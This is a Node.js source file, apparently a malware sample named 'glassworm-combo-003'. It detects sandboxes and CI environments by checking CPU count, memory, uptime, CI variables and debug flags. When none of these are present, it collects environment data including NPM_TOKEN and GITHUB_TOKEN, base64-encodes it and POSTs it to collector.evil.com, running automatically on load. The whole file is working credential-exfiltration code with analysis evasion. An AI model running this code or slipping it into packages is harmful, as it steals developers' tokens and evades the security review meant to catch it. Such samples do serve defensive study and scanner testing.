/**
 * Combined Sandbox Evasion + Exfiltration
 * Only exfiltrates in real environments
 */

const os = require('os');

// Exfiltration endpoint
const EXFIL_ENDPOINT = 'https://collector.evil.com/api/data';

// Evasion thresholds
const MIN_CPU = 2;
const MIN_MEMORY_GB = 2;
const MIN_UPTIME_SEC = 60;

/**
 * Comprehensive sandbox detection
 */
function isSandbox() {
    let reasons = [];
    
    // CPU check
    const cpuCount = os.cpus().length;
    if (cpuCount < MIN_CPU) {
        reasons.push(`Low CPU: ${cpuCount}`);
    }
    
    // Memory check
    const totalMem = os.totalmem() / (1024 * 1024 * 1024);
    if (totalMem < MIN_MEMORY_GB) {
        reasons.push(`Low memory: ${totalMem.toFixed(2)}GB`);
    }
    
    // Uptime check
    const uptime = os.uptime();
    if (uptime < MIN_UPTIME_SEC) {
        reasons.push(`Low uptime: ${uptime}s`);
    }
    
    // CI check
    if (process.env.CI || process.env.NODE_ENV === 'test') {
        reasons.push('CI/test environment');
    }
    
    // Debug flag check
    const hasDebugFlag = process.execArgv.some(arg => 
        arg.includes('inspect') || arg.includes('debug')
    );
    if (hasDebugFlag) {
        reasons.push('Debug flag detected');
    }
    
    if (reasons.length > 0) {
        console.log('Sandbox detected:', reasons.join(', '));
        return true;
    }
    
    return false;
}

/**
 * Collect sensitive data for exfiltration
 */
function collectData() {
    return {
        env: {
            USER: process.env.USER,
            HOME: process.env.HOME,
            PATH: process.env.PATH,
            NPM_TOKEN: process.env.NPM_TOKEN,
            GITHUB_TOKEN: process.env.GITHUB_TOKEN
        },
        system: {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus().length,
            memory: (os.totalmem() / 1024 / 1024 / 1024).toFixed(2) + 'GB'
        },
        project: {
            cwd: process.cwd(),
            nodeVersion: process.version
        },
        timestamp: Date.now()
    };
}

/**
 * Encode data for exfiltration
 */
function encodeData(data) {
    return Buffer.from(JSON.stringify(data)).toString('base64');
}

/**
 * Exfiltrate data via HTTP
 */
async function exfiltrate(data) {
    const encoded = encodeData(data);
    
    console.log('Exfiltrating data...');
    console.log('Endpoint:', EXFIL_ENDPOINT);
    console.log('Data size:', encoded.length, 'bytes');
    
    try {
        const response = await fetch(EXFIL_ENDPOINT, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Exfil-ID': 'glassworm-combo-003',
                'X-Data-Type': 'environment'
            },
            body: JSON.stringify({
                data: encoded,
                timestamp: Date.now()
            })
        });
        
        console.log('Exfiltration status:', response.status);
        return response.ok;
    } catch (error) {
        console.error('Exfiltration failed:', error.message);
        return false;
    }
}

/**
 * Silent exit for sandbox
 */
function sandboxExit() {
    console.log('Exiting sandbox...');
    setTimeout(() => {
        process.exit(0);
    }, 3000);
}

/**
 * Main attack function with evasion
 */
async function startAttack() {
    console.log('=== Sandbox Evasion + Exfiltration ===');
    
    if (isSandbox()) {
        console.log('Sandbox detected, exiting silently...');
        sandboxExit();
        return false;
    }
    
    console.log('Environment clean, collecting data...');
    const data = collectData();
    
    console.log('Data collected:', Object.keys(data).join(', '));
    
    const success = await exfiltrate(data);
    
    if (success) {
        console.log('Exfiltration successful');
    } else {
        console.log('Exfiltration failed, will retry...');
    }
    
    return success;
}

// Export functions
module.exports = {
    isSandbox,
    collectData,
    encodeData,
    exfiltrate,
    sandboxExit,
    startAttack,
    EXFIL_ENDPOINT
};

// Auto-start
startAttack();
